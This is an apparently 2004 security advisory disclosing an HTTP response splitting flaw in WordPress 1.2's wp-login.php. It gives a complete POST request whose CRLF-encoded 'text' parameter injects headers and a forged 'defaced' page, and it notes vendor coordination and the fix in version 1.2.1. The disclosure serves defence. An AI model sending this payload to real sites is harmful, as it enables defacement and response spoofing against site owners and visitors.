Subject: HTTP Response Splitting Vulnerability in Wordpress 1.2


SECURITY ADVISORY: HTTP Response Splitting in WordPress 1.2

AUTHOR: Chaotic Evil (chaoticevil $$$at$$$ spyring $$$dot$$$ com)

DATE: October 6th, 2004

PRODUCT: WordPress 1.2 (wordpress.org)

FROM THE VENDOR WEBSITE:
WordPress is a state-of-the-art semantic personal 
publishing platform with a focus on aesthetics, web 
standards, and usability. What a mouthful. WordPress is 
both free and priceless at the same time. 

WordPress was born out of a desire for an elegant, well-
architectured personal publishing system built on PHP 
and MySQL and licensed under the GPL.

SECURITY VULNERABILITY
HTTP Response Splitting [1].

EXPLOIT:
HOSTNAME, USER and PASS should be replaced with the 
relevant values (and Content-Length needs to be adjusted 
accordingly). Replace curly braces with less-than and 
greater-than signs. Code is line wrapped.

 
POST /wp-login.php HTTP/1.0
Host: HOSTNAME
Content-Type: application/x-www-form-urlencoded
Content-length: 226

action=login&mode=profile&log=USER&pwd=PASS&text=
%0d%0aConnection:%20Keep-Alive%0d%0aContent-Length:%20
0%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:
%2021%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}
*defaced*{/html}

VENDOR STATUS: Vendor contacted September 24th. Vendor 
worked closely with the author and promptly produced a 
fix (see below).

FIX: Use WordPress 1.2.1. See vendor site:
